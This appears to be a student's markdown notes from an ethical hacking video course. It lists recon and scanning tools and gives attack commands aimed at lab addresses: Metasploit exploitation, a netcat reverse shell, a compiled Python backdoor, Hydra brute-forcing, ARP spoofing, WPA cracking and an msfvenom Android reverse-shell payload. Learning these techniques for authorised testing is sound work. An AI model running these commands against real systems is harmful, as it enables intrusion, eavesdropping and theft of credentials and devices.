# Complete Ethical Hacking Bootcamp 2021: Zero to Mastery

https://www.udemy.com/course/complete-ethical-hacking-bootcamp-zero-to-mastery

## Section 4: Reconnaissance & Information Gathering
* ping
* whois
* nslookup
* https://ipinfo.info/
* whatweb
* theHarvester
* hunter.io
* sherlock

## Section 5: Scanning
* metasploitable
* arp
* netdiscover
* nmap

## Section 7: Vulnerability Analysis
* nmap scripts
* google search exploit
* searchsploit
* nessus

## Section 8: Exploitation & Gaining Access
* metasploit framework
  * msfconsole
```
msf6 > show exploits
msf6 > use exploits/windows/smb/ms06_640_netapi
msf6 exploit(windows/smb/ms06_640_netapi) > show info
msf6 exploit(windows/smb/ms06_640_netapi) > show options
msf6 exploit(windows/smb/ms06_640_netapi) > set RHOSTS 192.168.1.26
msf6 exploit(windows/smb/ms06_640_netapi) > show payloads
msf6 exploit(windows/smb/ms06_640_netapi) > set payload windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/ms06_640_netapi) > show targets
msf6 exploit(windows/smb/ms06_640_netapi) > set target 3
msf6 exploit(windows/smb/ms06_640_netapi) > exploit
msf6 exploit(windows/smb/ms06_640_netapi) > run
msf6 > search vsftpd
msf6 > sessions
msf6 > sessions -i <id>
```
* netcat
```
# Server
$ nc -lvp 12345
# Client
$ nc -e /bin/bash 192.168.1.9 12345
```
* telnet
* search routersploit

## Section 9: SMBGhost CVE 2020-0796 - Windows 10 Manual Exploitation
* https://rufus.ie/

## Section 10: Gaining Access (Viruses, Trojans, Payloads...)
* Msfvenom
```
$ msfvenom -p ...
$ msfvenom --list encoders
```
* virustotal
* veil
* TheFatRat
* Hexeditor

## Section 11: Post Exploitation - Elevating Privileges, Extracting Data, Running Keyloggers ..
* meterpreter (support both linux and window commands)
```
meterpreter > help
meterpreter > background
meterpreter > guid
meterpreter > getuid
meterpreter > pwd
meterpreter > dir
meterpreter > ls
meterpreter > shell
meterpreter > getsystem
meterpreter > search -f *.jpg
meterpreter > clearev
meterpreter > run post/windows/gather/enum_applications
```
* search bypassuac
```
msf6 > search bypassuac
```
* search persistence
```
msf6 > search persistence
```

## Section 12: Python Coding Project #2 - Backdoor
* run at server
```
$ python3 server.py
```
* run at client
```
$ python3 backdoor.py
```
* Compile to window exe file
```
$ pyinstaller backdoor.py --onefile --noconsole
```

## Section 13: Website Application Penetration Testing
* dirb
* burpsuite
* ShellShock
* Command Injection
* Reflected XSS
* Stored XSS
* HTML Injection
* SQL Injection
* CSRF Vulnerability
* Hydra Bruteforce Attack
```bash
hydra -h
hydra 192.168.1.9 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L usernames.txt -P passwords.txt
# Include cookie values
hydra 192.168.1.9 http-get-form "/dvwa/valnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: security=low; PHPSESSID=de86e1e9f8e1f54dfed367fd82665aaa" -L usernames.txt -P passwords.txt
```

## Section 15: Man In The Middle - MITM
* Bettercap ARP Spoofing
```bash
apt-get install bettercap
bettercap
>> help net.probe
>> net.probe on
>> help arp.spoof
>> set arp.spoof.fullduplex true
>> set arp.spoof.targets 192.168.1.7
>> help net.sniff
>> set net.sniff.local true
>> arp.spoof on
>> net.sniff on
>> exit

# sniff.cap store all above commands
bettercap -iface eth0 -caplet sniff.cap
```
* Check packet forwarding
```bash
cat /proc/sys/net/ipv4/ip_forward

# enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```
* Ettercap (Password Sniffing)
```bash
ettercap -G

# discover host on the network
# Host List
# Add to Target1
# MITM Menu > ARP poisoning
```
* check ARP cache
```bash
arp -a
```
* Poisoning Targets ARP Cache With Scapy
```bash
sudo scapy
>>> ls(Ether)
>>> ls(ARP)
>>> ls(TCP)
>>> ls(Ether)
>>> boardcast = Ether(dst='ff:ff:ff:ff:ff:ff')
>>> boardcast.show()
>>> ls(ARP)
>>> arp_layer = ARP(pdst='192.168.1.7')
>>> arp_layer.show()
>>> entire_packet = boardcast/arp_layer
>>> entire_packet.show()
>>> answer = srp(entire_packet, timeout=2, verbose=True)[0]
>>> print(answer)
>>> print(answer[0])
>>> print(answer[0][1].hwsrc)
>>> target_mac_address = answer[0][1].hwsrc
>>> packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.1.7', psrc='192.168.1.1')
>>> packet.show()
>>> send(packet, verbose=False)
```

## Section 16: Bonus: Wireless Access Point Cracking
* Putting Wireless Card In Monitor Mode
```bash
ifconfig
iwconfig
ifconfig wlo1 down
iwconfig wlo1 mode monitor
ifconfig wlo1 up
```
* Deauthenticating Devices & Grabbing Password
```bash
airmon-ng check wlo1
airmon-ng check kill
airodump-ng wlo1
# channel 2, mac_address 34:DA:B&:89:DB:A4, output_file TAKMICAR_test
airodump-ng -c 2 --bssid 34:DA:B&:89:DB:A4 -w TAKMICAR_test wlo1

# deauthenticate
airplay-ng -0 0 -a 34:DA:B&:89:DB:A4 wlo1 
# keep .cap file
```
* Aircrack Password Cracking
```bash
# file the password list
locate rockyou.txt
cp /usr/share/wordlists/rockyou.txt.gz /home/mrhacker/Desktop
gzip -d rockyou.txt.gz
aircrack-ng -w rockyou.txt TAKMICAR_test-01.cap
```
* Hashcat Password Cracking
```bash
hashcat --help
# password_hash WPA-EAPOL_BPKDF2 (2500)
# converse cap to hccapx (google cap to hccapx)
hashcat -a 0 -m 2500 1b05515dbe.hccapx rockyou.txt 
```

## Section 17: Bonus: Gaining Access To An Android Device
* Android VM Install (x86 7.1 R3)
  * Video Memory: 40MB
  * Graphic Controller: VBoxSVGA
* Andriod Meterpreter
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.169.1.9 LPORT=5555 -o shell.apk
# transfer shell.apk to the android
# set up the listening in msfconsole
msf5 > use exploit/multi/handler
msf5 expliot(multi/handler) > set payload android/meterpreter/reverse_tcp
msf5 expliot(multi/handler) > set LHOST 192.168.1.9
msf5 expliot(multi/handler) > set LPORT 5555
msf5 expliot(multi/handler) > run
```
* Evil Droid
```bash
./evil-droid
```
* apktool
* ngrok
